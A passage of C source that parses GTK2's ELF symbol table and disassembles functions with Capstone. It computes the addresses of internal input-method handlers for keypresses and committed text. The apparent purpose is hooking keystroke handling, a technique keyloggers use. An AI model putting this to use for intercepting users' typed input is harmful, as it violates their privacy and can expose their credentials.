                                                      printf("gtk_im_multicontext_filter_keypress is at address 0x%lx\n", foff);

                                                      cs_free(insn, count);
                                                      cs_close(&handle);

                                                      return foff;
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }

    cs_free(insn, count);
    cs_close(&handle);

    return -1;
  }

  unsigned long Get_gtk2_im_multicontext_commit_cb_addr(char *graphic_lib_path)
  {
    unsigned char *dlsym_faddr;
    int so_fd;
    char *so_map;
    struct stat so_fd_stat;
    Elf32_Ehdr *elf_hdr;
    Elf32_Shdr *elf_secs; /* elf sections */
    Elf32_Sym *elf_symtab; /* elf symbols table */
    Elf32_Sym *elf_symtab_end; /* elf symbols table */
    char *elf_strtab; /* elf string symbol table */
    unsigned long foff; /* function offset of the jmpq */
    int i;
    Elf32_Addr faddr; /* gtk_im_multicontext_set_context_id() dynamic symbol addr */
    csh handle;
    cs_insn *insn;
    size_t count;


    /*
    * ¿Por qué abro la libgtk+ y la mapeo, y no uso dlsym() y capstone directamente?
    *
    * Abro la librería libgtk+ y la mapeo, luego busco el símbolo y después uso dlsym() y no uso directamente
    * dlsym() y capstone porque la función a la que llama el símbolo (gtk_im_multicontext_set_slave) no hace un call
    * si no un jmp y por tanto el código asm, no es procesable genéricamente, porque el compilador podría usar cada vez
    * unos registros distintos. Entonces, aprovechando que la sección de símbolos tiene el tamaño de la función exportada,
    * y que el jmp está al final y el código fuente no varía en toda la v3, me pongo al final del desensamblado y saco
    * el offset, porque el jmp siempre está al final.
    */

    /* looking for gtk_im_multicontext_set_context_id() symbol  */
    so_fd = open(graphic_lib_path, O_RDONLY);
    if (so_fd == -1)
    {
      perror("open()");
      return -1;
    }

    if (fstat(so_fd, &so_fd_stat) == -1)
    {
      perror("fstat()");
      return -1;
    }

    so_map = (char *)mmap(0, so_fd_stat.st_size, PROT_READ, MAP_SHARED, so_fd, 0);
    if (so_map == MAP_FAILED)
    {
      perror("mmap()");
      return -1;
    }

    elf_hdr = (Elf32_Ehdr *) so_map; // the beggining of the binary and the ELF header.
    elf_secs = (Elf32_Shdr *)(so_map + elf_hdr->e_shoff); // that should be an array of section types.
    for (i = 0; i < elf_hdr->e_shnum; i++)
    { // iterate into the amount of sections in the array of sections.
      if (elf_secs[i].sh_type == SHT_DYNSYM)
      { // if the section type is the dynamic symbol table, then:
        elf_symtab = (Elf32_Sym *)(so_map + elf_secs[i].sh_offset); // point to the dynamic symbol table.
        elf_symtab_end = (Elf32_Sym *)(so_map + elf_secs[i].sh_offset + elf_secs[i].sh_size); // point to the end of the symbol table.
        elf_strtab = so_map + elf_secs[elf_secs[i].sh_link].sh_offset; // point to the string symbol table.
        break;
      }
    }

    while(elf_symtab < elf_symtab_end)
    {
      char *fname = &elf_strtab[elf_symtab->st_name];
      faddr = elf_symtab->st_value;

      if (strlen(fname) == 34
        && strncmp(fname, "gtk_im_multicontext_set_context_id", 34) == 0)
      {
        //printf("%s is at offset 0x%lx with size %lu\n", fname, faddr, elf_symtab->st_size);
        break;
      }

      elf_symtab++;
    }

    if (elf_symtab == elf_symtab_end)
    {
      fprintf(stderr, "gtk_im_multicontext_set_context_id symbol not found\n");
      return -1;
    }

    dlsym_faddr = (unsigned char *)dlsym(RTLD_DEFAULT, "gtk_im_multicontext_set_context_id"); // get the first address of the match
    if (dlsym_faddr == NULL)
    {
      perror("dlsym()");
      return -1;
    }

    printf("gtk_im_multicontext_set_context_id() is at address %p\n", dlsym_faddr);

    // looking for jmpq gtk_im_multicontext_set_slave
    if (cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -1;
    }

    // disassemble the last jmp
    count = cs_disasm(handle,
      (unsigned char *)so_map + faddr + (elf_symtab->st_size - 5),
      5,
      (unsigned long)dlsym_faddr + (elf_symtab->st_size - 5),
      0,
      &insn);

    if (count <= 0)
    {
      fprintf(stderr, "cs_disasm(1)\n");
      cs_close(&handle);
      return -1;
    }

    foff = insn[0].bytes[1]
      | (insn[0].bytes[2] << 8)
      | (insn[0].bytes[3] << 16)
      | (insn[0].bytes[4] << 24);

    foff = insn[0].address + insn[0].size + foff;

    printf("gtk_im_multicontext_set_slave() is at address 0x%lx\n", foff);

    // looking for gtk_im_multicontext_commit_cb()
    count = cs_disasm(handle, (unsigned char *) foff, 500, foff, 0, &insn);
    if (count <= 0)
    {
      fprintf(stderr, "cs_disasm(2)\n");
      cs_close(&handle);
      return -1;
    }

    size_t j;
    for (j = 0; j < count; j++)
    {
      // in x86 we search for the first call which is to __x86.get_pc_thunk.bx (rip-relative like trick for x86) and took the next instruction's offset which is and add,
      // then search for the corresponding lea to ebx and calculate the address of gtk_im_multicontext_commit_cb().
      if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
      {
        int add_qty = 0, call_c = 0;
        unsigned long address = 0;

        if (strlen(insn[j + 1].mnemonic) == 3 && strncmp(insn[j + 1].mnemonic, "add", 3) == 0)
        {
          add_qty = insn[j + 1].bytes[2]
            | (insn[j + 1].bytes[3] << 8)
            | (insn[j + 1].bytes[4] << 16)
            | (insn[j + 1].bytes[5] << 24);

          // save the address after the call is the (esp) value we're looking for, which is saved on ebx in the __x86.get_pc_thunk.bx func.
          address = insn[j + 1].address;

          // after the the 11th call there should be a lea, this lea is the correct one. Take its offset and calculate the address we are looking for.
          for(j += 2; j < count; j++)
          {
            if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
            {
              call_c ++;

              if (call_c == 9)
              {
                for (; j < count; j++)
                {
                  if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
                  {
                    foff = insn[j].bytes[2]
                      | (insn[j].bytes[3] << 8)
                      | (insn[j].bytes[4] << 16)
                      | (insn[j].bytes[5] << 24);

                    if (foff < 0)
                    {
                      foff = address + add_qty + (0 - foff);
                    }
                    else
                    {
                      foff = address + add_qty + foff;
                    }

                    printf("gtk_im_multicontext_commit_cb is at address 0x%lx\n", foff);

                    cs_free(insn, count);
                    cs_close(&handle);

                    munmap(so_map, so_fd_stat.st_size);

                    return foff;
                  }
                }
              }
            }
          }

          break;
        }
        else
        {
          fprintf(stderr, "add to ebx not found!\n");
        }
      }
    }

    cs_free(insn, count);
    cs_close(&handle);

    munmap(so_map, so_fd_stat.st_size);

    return 0;
  }

  unsigned long Get_gtk2_im_context_simple_filter_keypress_addr()
  {
    unsigned char *dlsym_faddr;
    unsigned long foff; /* function offset */
    csh handle;
    cs_insn *insn;
    size_t count;

    dlsym_faddr = dlsym(RTLD_DEFAULT, "gtk_im_context_simple_new");

    if (dlsym_faddr == NULL)
    {
      fprintf(stderr, "gtk_im_context_simple_new exported symbol not found!\n");
      return -1;
    }
    else
    {
      printf("gtk_im_context_simple_new is at address %p\n", dlsym_faddr);
    }

    if (cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -4;
    }

    count = cs_disasm(handle, dlsym_faddr, 32, (unsigned long)dlsym_faddr, 0, &insn);
    if (count > 0)
    {
      size_t j;
      int call_c = 0;

      for (j = 0; j < count; j++)
      {
        if (strncmp(insn[j].mnemonic, "call", 4) == 0 && strlen(insn[j].mnemonic) == 4)
        {
          call_c ++;

          if (call_c == 2)
          {
            foff = insn[j].bytes[1]
              | (insn[j].bytes[2] << 8)
              | (insn[j].bytes[3] << 16)
              | (insn[j].bytes[4] << 24);

            foff = (unsigned long)insn[j].address + insn[j].size + foff;

            printf("IA__gtk_im_context_simple_get_type offset at 0x%lx\n", foff);

            count = cs_disasm(handle, (void *) foff, 130, (unsigned long)foff, 0, &insn);

            for (j = 0; j < count; j++)
            {
              // in x86 we search for the first call which is to __x86.get_pc_thunk.bx (rip-relative like trick for x86)
              // and took the next instruction's offset which is and add, then search for the 2nd lea to ebx and calculate
              // the address of the next function we are looking for.
              if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
              {
                int add_qty = 0, call_c = 0, lea_c = 0;
                unsigned long address = 0;

                if (strlen(insn[j + 1].mnemonic) == 3 && strncmp(insn[j + 1].mnemonic, "add", 3) == 0)
                {
                  add_qty = insn[j + 1].bytes[2]
                    | (insn[j + 1].bytes[3] << 8)
                    | (insn[j + 1].bytes[4] << 16)
                    | (insn[j + 1].bytes[5] << 24);

                  // save the address after the call is the (esp) value we're looking for, which is saved on ebx in the __x86.get_pc_thunk.bx func.
                  address = insn[j + 1].address;

                  // after the the 11th call there should be a lea, this lea is the correct one. Take its offset and calculate the address we are looking for.
                  for(j += 2; j < count; j++)
                  {
                    if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                    {
                      call_c ++;

                      if (call_c == 3)
                      {
                        for (; j < count; j++)
                        {
                          if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
                          {
                            lea_c ++;

                            if (lea_c == 2)
                            {
                              foff = insn[j].bytes[2]
                                | (insn[j].bytes[3] << 8)
                                | (insn[j].bytes[4] << 16)
                                | (insn[j].bytes[5] << 24);

                              if (foff < 0)
                              {
                                foff = address + add_qty + (0 - foff);
                              }
                              else
                              {
                                foff = address + add_qty + foff;
                              }

                              printf("gtk_im_context_simple_class_intern_init is at address 0x%lx\n", foff);

                              count = cs_disasm(handle, (void *) foff, 130, (unsigned long)foff, 0, &insn);

                              for (j = 0; j < count; j++)
                              {
                                // in x86 we search for the first call which is to __x86.get_pc_thunk.bx (rip-relative like trick for x86)
                                // and took the next instruction's offset which is and add, then search for the 2nd lea to ebx and calculate
                                // the address of the next function we are looking for.
                                if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                                {
                                  int add_qty = 0, call_c = 0, lea_c = 0;
                                  unsigned long address = 0;

                                  if (strlen(insn[j + 1].mnemonic) == 3 && strncmp(insn[j + 1].mnemonic, "add", 3) == 0)
                                  {
                                    add_qty = insn[j + 1].bytes[2]
                                      | (insn[j + 1].bytes[3] << 8)
                                      | (insn[j + 1].bytes[4] << 16)
                                      | (insn[j + 1].bytes[5] << 24);

                                    // save the address after the call is the (esp) value we're looking for, which is saved on ebx in the __x86.get_pc_thunk.bx func.
                                    address = insn[j + 1].address;

                                    // after the the 11th call there should be a lea, this lea is the correct one. Take its offset and calculate the address we are looking for.
                                    for(j += 2; j < count; j++)
                                    {
                                      if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                                      {
                                        call_c ++;

                                        if (call_c == 2)
                                        {
                                          for (; j < count; j++)
                                          {
                                            if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
                                            {
                                              lea_c ++;

                                              if (lea_c == 1)
                                              {
                                                foff = insn[j].bytes[2]
                                                  | (insn[j].bytes[3] << 8)
                                                  | (insn[j].bytes[4] << 16)
                                                  | (insn[j].bytes[5] << 24);

                                                if (foff < 0)
                                                {
                                                  foff = address + add_qty + (0 - foff);
                                                }
                                                else
                                                {
                                                  foff = address + add_qty + foff;
                                                }

                                                printf("gtk_im_context_simple_filter_keypress is at address 0x%lx\n", foff);

                                                cs_free(insn, count);
                                                cs_close(&handle);

                                                return foff;
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }

    cs_free(insn, count);
    cs_close(&handle);

    return -1;
  }

  // this func returns the address of the named gtk2 method.
  unsigned long Get_gtk2_im_multicontext_filter_keypress_addr()
  {
    unsigned char *dlsym_faddr;
    unsigned long foff; /* function offset */
    csh handle;
    cs_insn *insn;
    size_t count;

    dlsym_faddr = dlsym(RTLD_DEFAULT, "gtk_im_multicontext_new");

    if (dlsym_faddr == NULL)
    {
      fprintf(stderr, "gtk_im_multicontext_new exported symbol not found!\n");
      return -1;
    }
    else
    {
      printf("gtk_im_multicontext_new is at address %p\n", dlsym_faddr);
    }

    if (cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -4;
    }

    count = cs_disasm(handle, dlsym_faddr, 32, (unsigned long)dlsym_faddr, 0, &insn);
    if (count > 0)
    {
      size_t j;
      int call_c = 0;

      for (j = 0; j < count; j++)
      {
        if (strncmp(insn[j].mnemonic, "call", 4) == 0 && strlen(insn[j].mnemonic) == 4)
        {
          call_c ++;

          if (call_c == 2)
          {
            foff = insn[j].bytes[1]
              | (insn[j].bytes[2] << 8)
              | (insn[j].bytes[3] << 16)
              | (insn[j].bytes[4] << 24);

            foff = (unsigned long)insn[j].address + insn[j].size + foff;

            printf("IA__gtk_im_multicontext_get_type offset at 0x%lx\n", foff);

            count = cs_disasm(handle, (void *) foff, 130, (unsigned long)foff, 0, &insn);

            for (j = 0; j < count; j++)
            {
              // in x86 we search for the first call which is to __x86.get_pc_thunk.bx (rip-relative like trick for x86)
              // and took the next instruction's offset which is and add, then search for the 2nd lea to ebx and calculate
              // the address of the next function we are looking for.
              if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
              {
                int add_qty = 0, call_c = 0, lea_c = 0;
                unsigned long address = 0;

                if (strlen(insn[j + 1].mnemonic) == 3 && strncmp(insn[j + 1].mnemonic, "add", 3) == 0)
                {
                  add_qty = insn[j + 1].bytes[2]
                    | (insn[j + 1].bytes[3] << 8)
                    | (insn[j + 1].bytes[4] << 16)
                    | (insn[j + 1].bytes[5] << 24);

                  // save the address after the call is the (esp) value we're looking for, which is saved on ebx in the __x86.get_pc_thunk.bx func.
                  address = insn[j + 1].address;

                  // after the the 11th call there should be a lea, this lea is the correct one. Take its offset and calculate the address we are looking for.
                  for(j += 2; j < count; j++)
                  {
                    if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                    {
                      call_c ++;

                      if (call_c == 3)
                      {
                        for (; j < count; j++)
                        {
                          if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
                          {
                            lea_c ++;

                            if (lea_c == 2)
                            {
                              foff = insn[j].bytes[2]
                                | (insn[j].bytes[3] << 8)
                                | (insn[j].bytes[4] << 16)
                                | (insn[j].bytes[5] << 24);

                              if (foff < 0)
                              {
                                foff = address + add_qty + (0 - foff);
                              }
                              else
                              {
                                foff = address + add_qty + foff;
                              }

                              printf("gtk_im_multicontext_class_intern_init is at address 0x%lx\n", foff);

                              count = cs_disasm(handle, (void *) foff, 130, (unsigned long)foff, 0, &insn);

                              for (j = 0; j < count; j++)
                              {
                                // in x86 we search for the first call which is to __x86.get_pc_thunk.bx (rip-relative like trick for x86)
                                // and took the next instruction's offset which is and add, then search for the 2nd lea to ebx and calculate
                                // the address of the next function we are looking for.
                                if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                                {
                                  int add_qty = 0, call_c = 0, lea_c = 0;
                                  unsigned long address = 0;

                                  if (strlen(insn[j + 1].mnemonic) == 3 && strncmp(insn[j + 1].mnemonic, "add", 3) == 0)
                                  {
                                    add_qty = insn[j + 1].bytes[2]
                                      | (insn[j + 1].bytes[3] << 8)
                                      | (insn[j + 1].bytes[4] << 16)
                                      | (insn[j + 1].bytes[5] << 24);

                                    // save the address after the call is the (esp) value we're looking for, which is saved on ebx in the __x86.get_pc_thunk.bx func.
                                    address = insn[j + 1].address;

                                    // after the the 11th call there should be a lea, this lea is the correct one. Take its offset and calculate the address we are looking for.
                                    for(j += 2; j < count; j++)
                                    {
                                      if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                                      {
                                        call_c ++;

                                        if (call_c == 2)
                                        {
                                          for (; j < count; j++)
                                          {
                                            if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
                                            {
                                              lea_c ++;

                                              if (lea_c == 3)
                                              {
                                                foff = insn[j].bytes[2]
                                                  | (insn[j].bytes[3] << 8)
                                                  | (insn[j].bytes[4] << 16)
                                                  | (insn[j].bytes[5] << 24);

                                                if (foff < 0)
                                                {
                                                  foff = address + add_qty + (0 - foff);
                                                }
                                                else
                                                {
                                                  foff = address + add_qty + foff;
                                                }

                                                printf("gtk_im_multicontext_filter_keypress is at address 0x%lx\n", foff);

                                                cs_free(insn, count);
                                                cs_close(&handle);

                                                return foff;
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }

    cs_free(insn, count);
    cs_close(&handle);

    return -1;
  }

  unsigned long Get_gtk2_im_context_simple_commit_char_addr(unsigned long gtk_im_context_simple_filter_keypress)
  {
    unsigned long foff; /* function offset */
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -1;
    }

    count = cs_disasm(handle,
      (unsigned char *)gtk_im_context_simple_filter_keypress,
      2300,
      gtk_im_context_simple_filter_keypress,
      0,
      &insn);

    if (count > 0)
    {
      size_t j;
      int call_c = 0;
      for (j = 0; j < count; j++)
      {
        if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0) {
          call_c++;
          if (call_c == 11)
          {
            foff = insn[j].bytes[1]
              | (insn[j].bytes[2] << 8)
              | (insn[j].bytes[3] << 16)
              | (insn[j].bytes[4] << 24);
            foff = (unsigned long)insn[j].address + insn[j].size + foff;

            printf("gtk2_im_context_simple_commit_char at offset 0x%lx\n", foff);

            cs_free(insn, count);
            cs_close(&handle);

            return foff;
          }
        }
      }
    }

    cs_free(insn, count);
    cs_close(&handle);

    fprintf(stderr, "gtk_im_context_simple_commit_char offset not found!\n");

    return -1;
  }

#endif
